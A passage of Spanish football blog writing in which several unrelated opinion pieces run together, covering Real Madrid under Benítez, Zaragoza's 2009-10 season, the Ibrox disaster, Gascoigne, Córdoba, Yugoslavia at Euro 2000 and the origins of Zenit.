reímos todos. Animaba pensar que una derrota en liga no nos condenaba al foso. No hay mayor consuelo que saber que no sólo vale ganar, que también suman los empates. Que la intrascendencia tiene a veces premio, que la tristeza es un partido más, pero no el definitivo. “Los combates cotidianos” que escribió Manu Larcenet. Ajustarse las medias y darlo todo sobre el campo. Son muchos partidos ya a nuestras espaldas, pero nos seguimos sintiendo futbolistas. Cambian los objetivos y ya no tenemos ni la velocidad ni el empuje de nuestros mejores años. Quizá esperamos sentados en el banquillo nuestra oportunidad. Y allí, con la sudadera puesta, mientras vemos a otros jugar mejor que nosotros, pensamos en jugar los últimos cinco minutos y marcar el gol que lo voltee todo. Ese gol a los miserables que nos están cosiendo a patadas. Soñar con ese tanto que los hunda en el barro, que les haga perder el partido. Aunque nos saquen veinte puntos en la clasificación, les dolerá la derrota. Aquí estamos, los tiesos plantando cara a los de siempre. A los que mandan. Somos el fútbol humilde a la fuerza. Y yo sueño con ese gol, con ese gol que quizá no llegue nunca. Sumergido hasta el cuello en la campaña electoral, me acosté ayer pensando en un debate moderado por Campo Vidal entre Benítez y Guardiola. “Tu relación con los jugadores siempre ha sido mala. ¿Cómo puede explicar lo de Touré y lo de Ibrahimovic? Es usted un entrenador incómodo y poco valiente con las estrellas”, espeta Benítez a Guardiola señalándolo con el dedo. “Mi idea del fútbol no necesita estrellas, sino jugadores que entiendan el sistema y curren para el equipo y no para ellos mismos. ¿Cuál fue el último canterano que subió, señor Benítez?” se defiende Guardiola. “Yo también gané la Champions, señor Guardiola, y con una plantilla con la que usted lucharía por clasificarse para la Europa League “, se sofoca Benítez. Campo Vidal pide tranquilidad. Guardiola bebe agua. Benítez ojea unos papeles. “Cuándo sepa qué hacer con Kroos, podemos empezar a hablar de fútbol”. Las redes echan chispas. Madridistas defienden a su técnico, barcelonistas agradecidos a Pep defienden al entrenador catalán. En la mesa hay dos formas de entender el fútbol. “A usted le sienta el 4-3-3 como a un mono un traje de flamenca” dice socarronamente Guardiola. “Yo me crié con ese sistema y lo aprendí de los mejores” concluye. “Si tan bueno es usted, coja un equipo de mitad de tabla. Es muy fácil lucir en el Bayern, un equipo acostumbrado a comprar todo lo bueno que sale en Alemania. Ahí no tiene rival. En Europa se demuestra que su equipo solo brilla entre mediocridades locales”, dice Benítez. Y Campo Vidal pasa a otro bloque.“La posición del centrocampista defensivo en el fútbol moderno” dice el moderador. Y Guardiola habla de Busquets mientras que Benítez enseña papeles sobre el rendimiento de Xabi Alonso y Hamann. “De Alonso podemos hablar mucho. Pregúntele quién cambió su fútbol, ahora que lo tiene en su equipo. Algo bien habremos hecho”, asevera el entrenador madrileño. Guardiola sonríe y repite “Ninguno como Busquets. Ninguno”. Hay en el fútbol un debate tan poco entretenido como este ficticio. La pregunta es si Benítez es un entrenador defensivo, si su idea de fútbol puede resistir en un equipo condenado a brillar como el Madrid. Ahora que Bayern y Barcelona, con propuestas de juego ofensivas, asociativas, preciosistas copan los elogios tras la primera fase de la Champions; el papel del Real Madrid es mortecino, grisáceo y se desprecia desde la afición y los medios. Otro fútbol es posible, parece decir la parroquia merengue. Esa “pegada” que va camino de ser una leyenda urbana viendo el atragantamiento de Bale y la temporada irregular de Cristiano Ronaldo. El Madrid nunca ha jugado a lo bonito. Nadie se lo ha pedido. El gol de Ramos, testarazo de último minuto en la Décima, es un modelo tan defendible como cualquier otro. Contraataques, juego de bandas, mediocentro peleón y delanteros que las meten todas (llámese Hugo, Emilio o Raúl). El fútbol moderno, que diría Guardiola, es otra cosa. Es triangulito tras triangulito en las mejillas del área. Es pared en el último tramo, son laterales ofensivos, porteros líberos, y defensas generosos con los espacios. Es un fútbol muy plástico cuando se gana. Cuando se pierde es más frustrante que la propia brega. No soy un enamorado del “método Guardiola”, será que tengo el paladar hecho a la Segunda división o qué vibré con Grecia o que la pareja Emerson-Diarra me daba más ternura que rabia. Pero golear jugando estéticamente es un placer al que no podemos renunciar como aficionados a este deporte.El problema del Madrid de Benítez es un problema de identidad. Ni nada a braza ni nada a crol, simplemente flota como un perro meneando ridículamente las patitas. Este Madrid no puede presumir de casi nada. Y presumir del portero, como se hizo al principio de la temporada, es asumir que el equipo está más vendido que unas bragas del mercadillo. Se apunta al Presidente con algo de razón. Florentino, tras muchos años en el poder, aún no sabe distinguir entre un club y un equipo. El club debe funcionar de césped para afuera. Deben cuadrar las cuentas, no someterse a la presión de los medios, luchar por una identidad comercial, exportar la marca, hacer equilibrios entre el deporte y la economía.Mejor dicho, visita Valencia cuando los locales gozan de mejor salud. El Valencia no pierde en liga desde el 4 de diciembre, aquel 0-2 en el Bernabéu, y por el camino ha engarzado triunfos de mérito ante equipos como el Espanyol, el Atlético de Madrid o, por encima de todos, el Athletic en San Mamés. 51 puntos no se  los echa a la mochila cualquiera. Lo cierto es que en estas ligas de nuevo cuño toca mirar al Barcelona y al Madrid desde el descansillo y a distancia pero Emery está firmando un curso similar al del año del doblete. Las críticas sobran.Del Barcelona se puede apuntar ya poco a estas alturas. Sus partidos, gane o pierda, están siempre cortados por un patrón diseñado para ser exitoso. Sin embargo, la actualidad y un codo han puesto el foco en dos frentes. De un lado, el regreso de David Villa al campo donde se hartó de celebrar goles y del otro una lupa merecida sobre David Navarro, noticia durante toda la semana por aquel espectáculo pleno de malas artes e interpretación que despachó en Bilbao. La suerte para el contundente central valencianista es que le tocará bailar con Lionel Messi y probablemente ni le alcance. Ingredientes, de calidad y fresquísimos, los que caerán está noche a la olla valenciana. Temporada mediocre la del Real Zaragoza en su regreso a Primera División. Tras el júbilo por el ascenso llegó un verano convulso durante el que, sin duda alguna, se tejieron los mimbres para el poco lustroso cesto que el clásico blanquillo ha despachado en la temporada 2009-2010. Con la entidad ahogada en un cenagal de deudas, aun no se descarta la opción de entrar en Ley Concursal, los bandazos de la directiva encabezada, aun entonces, por Eduardo Bandrés se sucedieron en el arranque. Incorporaciones sospechosas, en tiempo y forma, como las de Marko Babic o Obradovic, la imposición de Gerhard Poschner, de profesión representante, al frente de la dirección deportiva o la apuesta por un Marcelino García Toral cuestionado de inicio por sus jefes fueron algunas de las piedras que el Zaragoza tuvo que superar. No obstante lograron la salvación con cierta holgura merced a una segunda mitad de campeonato notable.Arrancar con el fichaje estrella, el Uche bueno, en la enfermería es un lastre enorme y el rendimiento del equipo se vio claramente mermado por la circunstancia en los primeros partidos. No enchufaban y de veinte encuentros los maños sólo supieron ganar tres. Floreció el empate, es cierto, pero el dato es demoledor. Con la masa social solivientada, todos sabemos que Zaragoza es plaza dura, llegó el Athletic a La Romareda para pescar tres puntos y robarle la paciencia del respetable. La cosa rompió en mil pedazos y tuvieron que hacer las maletas el entrenador, apoyado aun por la mayor parte de la afición, y Bandrés para ceder las riendas del equipo a Agapito Iglesias en lo contable, máximo accionista de la entidad y a la dupla Gay-Nayim en lo deportivo. Fue un giro de timón obligado en una nave que aun tardó en equilibrar su rumbo.El 0-6 encajado en la visita al Santiago Bernabéu no fue, por esperado, menos doloroso para la bancada maña y la desconfianza sobre la pareja técnica flotaba en el ambiente. Hasta que llega el invierno. En un intento tan desesperado como valiente por reconducir el desaguisado, el Zaragoza (fiel a su leyenda de buen gastador) mudó drásticamente de piel y logró la firma de siete futbolistas. Practicamente un equipo. Llegan Jiri Jarosik, Roberto Jiménez, Edmilson, Eliseu, Adrian Colunga, Matteo Contini y el Chupete Suazo. Se van el ratón Ayala, Nobrega, Songo’o, Ewerthon, de Souza y López Vallejo. El cambio, contra todo pronóstico de los agoraros entre los que me incluyo, le viene de perlas al vestuario y todas y cada una de las incorporaciones resultan. Es más, acaban jugando minutos y siendo, Suazo y Contini son el paradigma, decisivos en la salvación.Desde la goleada contra el Real Madrid los blanquillos fueron capaces de sumar la friolera de 29 puntos y eso les ha valido para amarrar una salvación que, aun alarmantemente barata (37 puntos), ha de ser el cimiento que sustente temporadas más sosegadas en La Romareda. Ha de comenzar ahora una nueva etapa en la entidad presidida por Agapito Iglesias. Sin más dilación se han de resolver cuestiones importantes: la continuidad de José Aurelio Gay y Nayim al frente del banquillo y la reconstrucción de la plantilla son los principales retos que deberá enfrentar la entidad de cara a una nuevo curso que será clave para calibrar el futuro del equipo a medio plazo en Primera División. La exigencia, como siempre en tierras aragonesas, será alta. 66, 13 y 40. Si esta pieza tratase de Italia las cifras hablarían de astros manchando la camiseta a base de caprichos pero es Escocia y nos llevan a asuntos ciertamente más grises. 66 fueron las personas que nunca pudieron regresar a casa en aquel Rangers-Celtic de 1971. Hablo del desastre de Ibrox. De la infame escalera 13 que barnizó de sangre el derby de año nuevo hace exactamente 40 años. Viene a cuento porque en un ratito se disputa una nueva edición del Old Firm y los máximos rivales tienen previsto homenajear a los fallecidos de un modo especial.Muy consciente de que se estaba jugando sus opciones frente a compañeros con muchas más horas de vuelo, Thiago jamás perdió la cara al partido. Frenó cuando hubo que meter pausa y aceleró cuando hubo que despertar el choque. Tiene pinta de que, con esa confianza del técnico, irá creciendo al mismo que lo hace en el Bayern y eso, ahora mismo y ante el evidente declive del señor Hernández, son buenísimas noticias para la selección.Ver jugar a España me produce ansiedad. Ansiedad porque quiero que jueguen todos. Porque cuando hay que introducir algún cambio en el equipo, todos me parecen idóneos para salir a entremezclarse con el resto de la orquesta. Porque no sabría decidirme entre Cazorla, Silva, Mata, Pedro, Fàbregas, Iniesta, Navas… Porque no hay nadie que desentone, porque no hay ninguno del que estés seguro de que no será capaz de ofrecer nada para el equipo. El relevo generacional está asegurado. Esperemos que no muera de éxito. Hay algo que aquellos que no profesamos especial simpatía por la figura de Diego Pablo Simeone debemos de agradecer al técnico argentino. El Cholo ha recuperado del olvido, y tras catorce años sin incertidumbre con veinticinco partidos consecutivos sin victoria atlética desperdigados por la cuneta, un enfrentamiento antológico, un duelo de poder a poder por la hegemonía en la capital de España. La llegada del exfutbolista colchonero al banquillo del Calderón revitalizó una rivalidad que en los últimos años parecía aletargada por el mucho de unos y el casi nada de los otros, ofreciendo un regalo al aficionado que algunos ya daban por definitivamente perdido en los almanaques.Tanto es así que con lo que la historia reciente nos ha dejado en la memoria cuesta asimilar que a día de hoy, y si nos ceñimos a los resultados desprendidos de los enfrentamientos directos entre ambos equipos, el presente sea de color rojiblanco, por más que el madridismo acuñara una muesca más en la culata de su revólver en aquella recordada noche lisboeta. Con todo, no fue la de ayer la mejor versión conocida de este Atlético de Simeone. La sensación postpartido deja a un Madrid, si no victorioso, sí vencedor al menos a los puntos y jugando con la bala de la recámara del partido de vuelta entre sus dedos, conocedor de la ligera ventaja que parece haber adquirido en la eliminatoria tras el trabajado empate en el Manzanares.Una primera mitad con un Madrid superior y autoritario y con su ofensiva empeñada en engrandecer golpe a golpe a Oblak, en la que fue la primera gran noche como colchonero del meta esloveno, dejó cierta sensación de desasosiego en los visitantes. Siendo considerablemente superiores al Atleti por primera vez en lo que llevamos de temporada, una mala noche de sus puntas le había impedido tomar ventaja en el marcador. Cuando pudo, bien neutralizado por la defensa atlética, no lo consiguió. Y eso, unido al bajón físico muy especialmente patente en los recientemente reincorporados Modric y James, pareció dar alas a los rojiblancos. Porque en la segunda mitad la superioridad blanca se fue diluyendo conforme transcurrían los minutos, disipada tras la sangre que brotaba de la ceja de Mandzukic, que envalentonó a los suyos dando al partido el tinte bélico que la grada demandaba, y enredada entre la aleación de fútbol que conforman Arda y Koke cuando ambos tienen a bien asociarse. Simeone acertaba con la entrada de Raúl García e Isco, la primera y celebrada opción de Ancelotti, naufragaba en mitad de la tormenta por incorporarse al choque con un ritmo claramente insuficiente para lo que se venía exigiendo. Y fue en ese momento, con el Atlético afinando hacia su mejor versión y Casillas dando algún motivo para la inquietud, cuando el madridismo empezó a percibir ese empate a cero como una indudable ventaja para el choque de vuelta. Hay personajes cuya trascendencia social ha ido mucho más allá de su trascendencia y su importancia real. Sus actos, premeditados o no, los han terminado elevando a una supracategoría especial, por encima de sus congéneres y compañeros de profesión. En ocasiones, incluso, llegando a alcanzar mayores cotas de popularidad que otros similares con mayores logros profesionales.Paul Gascoigne (Gateshead, Inglaterra, 1967) fue un buen jugador, pero no un descomunal futbolista. Un elegido, pero no un superdotado. Con todo, Gascoigne fue dueño de una personalidad indudable, un deportista de innegable carácter icónico y, en algún momento de su accidentada carrera profesional, el futbolista más popular de su país. En eso, al menos, no hubo nadie capaz de superarlo.John Greig y Billy McNeill, capitanes del Rangers y del Celtic de la época, lideraran a los jugadores actuales y a una comitiva de miembros de los dos equipos presentes durante la tragedia de 1971 en su entrada al campo. Honorable gesto. Especialmente porque sucederá en medio de un derby cuyo aliño habitual es esa salsa mezcla de fanatismo, odio y nonsense que tanto gusta a propios y extraños.No les aburriré con detalles sobre como la tragedia tomó forma aquel 2 de enero del 72, los encontrarán en la red sin bucear excesivamente, pero me llama la atención el barniz mítico, al futbolero modo, que arropó al suceso durante años. La historia pintaba una escalera 13 de Ibrox escenario de la peor de las masacres debido a un choque entre le gente que abandonaba el estadio y los que, excitados al escuchar la grada local celebrando un gol postrero de Colin Stein que les daba el empate en la agonía, desandaron el camino para encontrarse con la muerte. Más tarde se comprobó que todo sucedió por accidente. Que algún hincha en la cima del mal acondicionado acceso se tropezó y provocó con su caída una avalancha fatal. “Fue como si alguien hubiese tirado una baraja de cartas”, recuerda Ian Loch, uno de los supervivientes. Una baraja con 66 muertos y más de 200 heridos.La tragedia en la escalera 13 también fue una historia de entrenadores. Jock Stein, míster del Celtic y cromo imperecedero del fútbol escocés desde la hazaña de Lisboa, fue de los primeros en comprender la magnitud del suceso y que tras enviar a sus futbolistas de vuelta a Parkhead, no se le cayeron los anillos por sumarse a los voluntarios y empujar camillas toda la noche y echar una mano a los servicios médicos. Ejemplar. Otro que observó el horror de cerca fue Walter Smith, entrenador actual del Rangers. Smith, que por entonces se ganaba los garbanzos defendiendo los colores del Dundee United, libraba aquella noche y había aprovechado para acercarse a Ibrox en compañía de su hermano y disfrutar del derby. “Conseguimos trepar por una valla. Debimos pasar por encima de algunas personas para salir.” Tras el desastre Ibrox nunca volvió a vestir el mismo traje. Afortunadamente el sentido común, espoleado por las repetidas desgracias, movió al fútbol escocés a elaborar y aplicar puñado de normas de seguridad que cambiaron la casas del fútbol para siempre. El Rangers encabezó las iniciativas en favor de unos estadios más seguros y sometió al suyo a una de las transformaciones más drásticas que haya sufrido jamás un campo de fútbol británico. Ibrox mutó del famoso feudo oval, en la línea del viejo Stamford Bridge o Hampdem, al icónico rectángulo con gradas de asiento que ahora conocemos. Al moderno estadio que hoy acoge una nueva edición del Old Firm marcada por el recuerdo a los ausentes.Starway 13: always remembered (documental) Lo de anoche en Liverpool fue la sublimación de ese lugar común del folclore futbolístico que es la noche europea en el filo de la navaja. El Liverpool y el Atlético de Madrid (dos maestros del subgénero copero) de actores  principales, la caldera de Anfield calentando el cocido como en las grandes ocasiones y la agonía nerviosa del añadido. La mística. Todo eso estaba y por suerte para los colchoneros también el viejo pistolero que aparece para reivindicarse a última hora. Ocurrió en el minuto 102, tres cifras que los atléticos recordarán durante mucho tiempo. Hasta entonces propuso más el conjunto de Benítez, afición y compromiso obligan, y volcó el campo hacia el Kop hasta adelantarse por dos veces en el marcador. Aquilani y Benayoun, posiblemente dos de los pocos futbolistas salvables del rosario de desastrosas contrataciones de Benítez, fueron los artífices. Apretó de lo lindo el conjunto inglés, fiel al carnet de identidad y los de Quique Flores no le encontraron el aire al envite hasta el final del mismo cuando sí pudieron, a base de contragolpes, meterle el agua en casa al Liverpool. Pero cuando la cosa pintaba ciertamente en rojo, en un suplemento que los reds pudieron decantar a su favor vía Benayoun, los colchoneros sacaron lo mejor de si mismos. Diego Forlan, el uruguayo, en la agonía, aprovechó una jugada plena de clase de Jose Antonio  Reyes para abrirle al Atleti las puertas de una final europea que no  disputaba desde 1986. Ocurrió en el 102. Ahora espera Hamburgo, el Fulham y la historia. Tu hermano mayor, ese cabrón que te agarra del cuello como si fueras un pelele y te restriega los nudillos por la cabeza entre risotadas. El que un día se digna a jugar al fútbol con tus colegas y os pega un repaso de espanto justo cuando creías que le podías meter mano. Después palmadita condescendiente en el moflete. Ese perro, tu hermano, con el pelo cortado al uno y la cara de granito lleva puesta una camiseta a rayas blancas y negras.La Juventus desmontó a la Roma en el partido más importante de la primera vuelta en Italia con la contundencia necesaria para reducir el debate al mínimo. ¿Habrá o no ‘scudetto’ de aquí a final de temporada? De nada parece servir que los de Rudi García se hayan cascado el mejor arranque en la historia de la competición o que el Nápoles de Higuaín ya sea mejor en el conteo que el de Maradona. Los turineses se han rascado la postilla europea hasta dejarse la cara sin cicatrices. Pronto la tendrán como la de un bebé.Y eso que la Roma saludo a Turín con media hora notable, con treinta minutos académicos. Pjanic movía con inteligencia al equipo y Totti enganchaba desde la posición de nueve hacia el centro con soltura. Buenos pases, abundantes, y la voluntad clara de dominar el centro del campo raseando la pelota. La Roma hacía la suya y tan solo permitía el ataque juventino por el centro, justo la zona que Castán y Benatia tienen alquilada como frontón desde agosto. Ilusionante pero insuficiente frente a los nudillos del Apache. En una jugada fulgurante, Lichtsteiner le entregó la pelota a Tévez en mitad del área y el argentino se acordó del potrero. Vueltecita, retrovisor y pase en ventaja a Vidal que mató la jugada con una simpleza insultante. Todo lo que le faltó a la Roma en el primer tramo de encuentro lo pusieron sobre la mesa los locales en un abrir y cerrar de ojos. Profundidad y veneno entre líneas.No se achantó el candidato tras el tanto y ahí está el valor de este proyecto inesperado, de este gran equipo fabricado de la noche a la mañana. La gente de Totti se mantuvo fiel a sí misma hasta el 2-0 pese a que cada intentona entre líneas se conviertiera en una aventura incierta (mal Totti y directamente invisible Ljajic en la tarea), a pesar de la lesión de Pjanic (su centrocampista más determinante de largo) o a la incomparecencia de Gervinho. La Roma manejó el ‘bullying’ hasta que apareció otro tipo de matón. Pirlo, que intimida tan solo con un paseíto, ejecutó con delicadeza y precisión un tiro libre desde la izquierda y ese tiro Bonucci lo supo leer mientras que la defensa romanista todavía está buscando el diccionario. Organización demencial y mazazo irreversible. Fue el  canto de sirena de los visitantes en el partido pese a los intentos vanos de García por avivar algo la pelea con un par de cambios tan valientes como discutibles. ¿Por qué castigar a la afición con 90 minutos de este Ljajic)El espíritu guerrillero de Castán y de De Rossi (mano a lo Mutombo en la línea de gol y entradón a Chiellini respectivamente) desembocó en dos expulsiones y el gol de penalti de Vucinic. Con superioridad la Juve ya no quiso hacer sangre. La Roma perdió su primer partido del año como se hacen las cosas en Roma, a lo grande y con estrépito.Caía bien allá por donde iba, por eso no le costó integrarse ni en Roma, durante su etapa en la Lazio, ni en Glasgow, ni en ninguna de las ciudades a las que su carrera deportiva le fue llevando. Un extrovertido profesional gobernado por una excentricidad sin control.Simon Kuper, en su imprescindible ‘Fútbol contra el enemigo‘ (Ed. Contra, 2012) explica de manera brillante el nacimiento de lo que se dio en llamar ‘Gazzamania‘. Las lágrimas derramadas por el genio inglés en la semifinal que Inglaterra disputó frente a Alemania en el Mundial de Italia 90 fueron las lágrimas de todo un país. Las mismas lágrimas, mezcla de tensión y decepción, vertidas en miles de sofás de toda la geografía inglesa. Aquella noche, cuando el joven Gazza rompió a llorar sobre el césped tras ver la cartulina amarilla que le hubiese impedido jugar la final mundialista si su selección se hubiera clasificado para la misma, se ganó un lugar preferente en el corazón de todos los aficionados ingleses porque lo hizo de manera inocente y sincera. Pero no fue la única ocasión a lo largo de su vida deportiva. El propio futbolista reconocería años después que llorar, dejar escapar la lágrima de manera intencionada, le había resuelto más de una papeleta complicada.Gascoigne fue un histrión. Una expresión de la teatralidad del fútbol llevada al extremo. Aquel Mundial italiano supuso tal vez su actuación más recordada, siendo un futbolista de importancia capital en el camino que llevó a Inglaterra hasta la semifinal del torneo. Puede que todo fuera fruto de su irresponsabilidad y de su actitud despreocupada ante lo que se le venía encima. Chris Waddle, compañero de Gazza en aquel Mundial, llegó a comentar que el secreto de Gascoigne en aquel campeonato fue haberlo jugado siendo completamente inconsciente de su trascendencia, ajeno a cualquier tipo de presión. ‘¡Le hablaba acerca de Rijkaard y él pensaba que me estaba refiriendo a un país! ‘. Gascoigne creció. Tuvo que tragar mil y una críticas.Pero un equipo es el centro del huracán. Si no hay equipo no hay victorias, si no hay victorias no hay títulos, y si no hay títulos no hay forma humana de defenderse.No es que Ancelotti fuera Menotti, pero desde luego el equipo daba la sensación de jugar en conjunto. El Madrid de ahora, con su peor versión en el choque reciente contra el Villarreal, es un sumadero de talento sin dirección conocida. Es una pelota de ping pong cuando ha salido disparada de la mesa. Las lesiones no pueden ser excusa para uno de los clubes más acaudalados del mundo. Ni la suerte, ni el césped, ni el árbitro. No hay manera de defender a un equipo que no juega a nada. Un equipo que, como el otro día, depende de los arreones de un lateral izquierdo. El Madrid juega a parchís con las piezas del ajedrez. Tiene jugadores para algo más que moverse casi azarosamente por el tablero. La ´incertidumbre Casemiro´, la ´disolución Bale´, la ´disipación Ramos´. Teorías con apellidos, para ver si se memorizan mejor.En el debate habría quien dijera que ganó Benítez. No creo, citando al poeta surrealista Gerhard Rodax, que Benítez “antes fuera tan bueno, ni ahora es tan malo”. Lo que si me escama es que “el principal partido de la oposición”, aquel que lleva años defendiendo que se pueden sumar títulos con un juego basado en la individualidad, el contraataque, la pegada, la solidaridad entre líneas o la pura y más primaria pasión; tenga tan pocos argumentos para defenderse ante un modelo de juego que, entre otras cosas, dio un Mundial a España o los mayores honores para un club como fue la época dorada del Barcelona con Guardiola a los mandos. Yo he votado al Madrid de toda la vida. Confío en su particularísima forma de entender el fútbol, en sus Juanitos, Redondos, aguanises y Micheles. Pero si me tengo que ceñir al debate de este año, quizá me abstenga en estas elecciones. Los militantes ya hablan de algo tan político como “la purga”. Esperemos, en junio, el resultado de los comicios. Mientras tanto, veamos como debaten. Nadie gana una partida de ajedrez por echarle huevos al asunto. Las piezas son las que son y el movimiento debe ser inspirado y preciso. No se deja de mirar el tablero ni se dedica uno a jugar con la cabeza pelona del peón mientras el rival mueve a su reina en busca de nuestro rey. No hay cuchillos en la boca en el ajedrez y menos cuando uno va ganando. No entiendo como hay aficionados cuya respuesta ante la derrota es siempre la misma: “no tuvieron cojones”. Los cojones son un medio pero no el fin. No hay fútbol sólo con cojones y no hay cojones que ganen un partido solos. Simeone podría escribir una tesis sobre esto. No puede ser que el Córdoba perdiera ayer el partido que perdió. No puede pasar que juegues en casa, tengas mejor equipo, tengas la posesión del balón, un gol por delante en el marcador, y termines sometido por un Almería más muerto que el padre de Simba.Y no es enfado sino tristeza. La manera en que duelen las derrotas es difícil de explicar a alguien a quien no le guste el fútbol. Primero la ira y después una neblina en los ojos. Al final los músculos se destensan, tras noventa minutos constreñidos, y ese proceso de laxación escuece. Escuece como pelar gambas con un padrastro. Y después, cuando la derrota aún tintinea en la pantalla de la televisión, cuando los jugadores dan explicaciones que no queremos oír, intentas pensar en otra cosa pero en tu cabeza sólo hay números, escudos de otros equipos que suben y bajan en un ascensor imaginario, y una desolación infantil e irrevocable.Tres derrotas consecutivas lleva el Córdoba (Madrid, Celta y Almería) y el premio es ya acampar como un scout en los puestos de descenso. Ayer el partido empezó perfecto. El once que mejor fútbol le ha regalado al equipo, con Krhin y Zuculini aún en el banquillo y un Cartabia que volvía a la zona de mediapunta. El argentino hizo todo bien al principio, basculó al equipo, dio pausa y respiro, conectó con las bandas de Ghilas y Bebé, y se hizo con la posesión ayudado por un Rossi cada vez más asentado y un Deivid que empieza a salir de la cueva para sumarse con alegría al ataque. El gol de falta levantó al Arcángel. El Almería estaba fuera del partido, la guerra de Thievy era trágica. Luchaba en soledad contra un equipo seguro y con los tres puntos –y qué tres puntos- en la mochila.El descanso fue un antídoto para el veneno que el Córdoba inoculó al Almería. Los que ayer vestían de rosa y negro salieron a por el partido, como si hubieran descubierto que quizá un gol no era tanta montaña por escalar. El equipo espoleado por Corona y Edgar Méndez se comió primero el centro del campo y después a la defensa local que volvía a sufrir en el costado de Gunino y con un Pantic algo más lento de lo habitual. Pasó lo que debía de pasar: Michel marcó dos veces. En el primer gol se aprovechó de una defensa desajustada y en el segundo de uno de los puntos débiles de Juan Carlos, su juego por alto. El 1-2 ya no se movió del marcador.Encontrarle respuestas a la derrota, si hablamos estrictamente de fútbol, no es tan sencillo. El equipo blanquiverde se durmió y el Almería, con mucha experiencia ya en Primera, supo que hay que jugarlo todo. Eran tres puntos importantes, tanto que es una frivolidad dejarlos ir como se fueron. Djukic, tras la goleada en el Camp Nou, puso de moda aquello del cuchillo entre los dientes. Si el equipo pierde debe luchar más. El Córdoba se puso a carburar y vinieron victorias importantes y buenos partidos. Pero el discurso de “los cojones” ya se ha acabado y el balance no ha sido tan positivo.Los refuerzos de invierno dan a la plantilla blanquiverde argumentos que van más allá de morder las espinilleras del rival. Krhin y Zuculini son jugadores con talento y experiencia. Edimar está asentado.Salió de su país hacia un campeonato, el italiano, que devoraba talentos a ritmo de vértigo. Pero no llegó a madurar. Siguió siendo el mismo inocente y despreocupado chaval de 1990, aquel que se bajó del avión en Londres a la vuelta del Mundial con unas tetas y una barriga postizas en clara alusión a aquellos que habían largado acerca de su sobrepeso. Y la vida se lo acabó zampando. Condenándolo a una existencia penosa e indisimuladamente problemática. Mi mejor recuerdo de un Mundial es de Italia 90. Quizá es porque era un niño, despreocupado e inocente, y aquello me parecía todo maravilloso. Puedo imaginar lo que debe de sentir Gazza cada vez que tira de recuerdos y se planta en mitad de aquella noche turinesa. ‘Kosovo je Srbija! ‘. La mañana del 21 de junio del año 2000 la ciudad de Brujas me recibió con un grito estruendoso. Dejándome claro que, a ojos de aquella manada de mostrencos, Kosovo seguía siendo Serbia. Después de ni se sabe de horas por carretera, en aquellos tiempos pre GPS, no pude tener una bienvenida más tensa en la mañana definitiva de aquel despreocupado road-trip en clave futbolera. España se jugaba el ser o no ser en aquella Eurocopa de Bélgica y Holanda. Había llegado a la última jornada de la fase de grupos con una mínima esperanza de pasar a cuartos de final, después de haber caído por la mínima ante la débil Noruega y de haber sufrido para imponerse a la aún más débil Eslovenia en el segundo partido del grupo. Con tres puntos en el casillero, Yugoslavia, que aventajaba a los nuestros por un punto, aparecía en escena como el gran escollo de esta fase inicial. Todo lo que no fuera vencer a los balcánicos implicaba quedarse fuera en un grupo tremendamente asequible.Cuando uno escribe a día de hoy la palabra ‘Yugoslavia’ lo hace siempre apoyándose en una sensación de nostalgia. Yugoslavia alcanzó un estatus mítico en multitud de deportes. El ultra competitivo carácter balcánico, la profesionalización e hiper especialización de los deportistas del este de Europa y un fuerte sentimiento patriótico contribuyeron a forjar un buen número de leyendas deportivas en muy variopintas disciplinas. No vamos aquí a profundizar en el potencial de aquella inolvidable selección de baloncesto yugoslava que la guerra se llevó por delante, ni en la selección de waterpolo bicampeona del mundo a finales de los años ochenta. No es necesario que salgamos del fútbol para buscar el ejemplo. Poco antes del comienzo de su disolución definitiva, Yugoslavia había conseguido aglutinar un equipo considerablemente potente con los Stojković (serbio), Sušić (bosnio), Pančev (macedonio), Katanec (esloveno) Vujović (bosnio) o Prosinečki (croata). Una amalgama tan variada y heterogénea como los orígenes étnico-regionales de sus integrantes. Aquel combinado acabó en quinta posición final en el Mundial de Italia de 1990. Su mejor clasificación histórica en un campeonato del mundo. El gran espectáculo de fuegos de artificio que precedió al desastre.Doce años después del mundial italiano y del gol de Stojković sobre la cabeza de Míchel, un demoledor puñetazo sobre la mesa balcánica ya había hecho saltar el puzzle yugoslavo en mil piezas. Las tensiones nacionalistas seguían latentes como el primer día del conflicto bélico. El combinado que representaba, aún de manera conjunta, a Serbia y Montenegro había heredado el nombre de la ya extinta Yugoslavia y ellos, y nadie más, eran la ‘verdadera Yugoslavia’. Fue su última participación en un torneo deportivo bajo el nombre del icónico conglomerado partisano. Y fue el inolvidable gol de Alfonso Pérez el que dio la defintiva puntilla deportiva a un equipo legendario.Puedes encontrar las camisetas de Yugoslavia (y de Serbia, y de Croacia, y de Montenegro, y de Bosnia-Herzegovina, y de Eslovenia, y de Macedonia) en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Pronunciar el nombre de San Petersburgo evoca a gloriosas épocas pasadas. A zares, a palacios, a imperio, a esplendor y a una Rusia que hace tiempo que dejó de existir. No cabe duda de que la gran puerta rusa hacia el comercio marítimo con el resto del continente vivió épocas mejores que las que la cruel historia del siglo XX terminó deparándole. La gran perla del Báltico nunca se terminó de recuperar de las consecuencias que siguieron a la Revolución bolchevique de 1917. La caida de los zares, el alzamiento de los soviets y el posterior traslado de la capitalidad del país a la menos occidentalizada y más aislada Moscú supusieron un durísimo golpe para la antaño floreciente San Petersburgo.La abusiva centralización política y económica a la que fue sometido el país a raíz del nacimiento de la Unión Soviética en 1922 terminó de rematar a la gloriosa Leningrado. Paralelamente al movimiento centralizador que, a lo largo del siglo XX, atrajo a las instrucciones sociales y políticas hacia la nueva capital soviética, y que contribuyó muy notablemente a diezmar la población de la ciudad báltica, el fútbol soviético sufrió un proceso muy similar. Moscú y los clubes moscovitas acapararon mayoritariamente, y siempre con la permanente excepción del poderoso Dinamo de Kyev, el grueso de los éxitos del fútbol nacional. Spartak, CSKA, Dynamo y Torpedo ejercían una imparable fuerza para atraer el foco futbolístico hacia la capital, en una muestra más de la marcadísima tendencia promoscovita del régimen soviético. Mucho antes de la llegada de la inyección económica del gigante Gazprom a finales del año 2005, el fútbol en San Petersburgo no desprendía ese olor a rublos e inversiones millonarias que desprende en la actualidad. Fundado en 1925, sólo tres años después del nacimiento de la URSS y en una época repleta de cambios sociales y políticos, el Zenit hunde sus raíces en las sociedades deportivas soviéticas que estructuraban la práctica deportiva y de la educación física en el régimen bolchevique. A imagen y semejanza de la Spartak, la sociedad que reunía a los trabajadores del comercio, el transporte o la educación que deseaban practicar deporte, la Dynamo, la del cuerpo de policía, la CSKA, del ejército, o la Torpedo, vinculada a la industria de la automoción, la sociedad deportiva Zenit agrupaba a los trabajadores de la 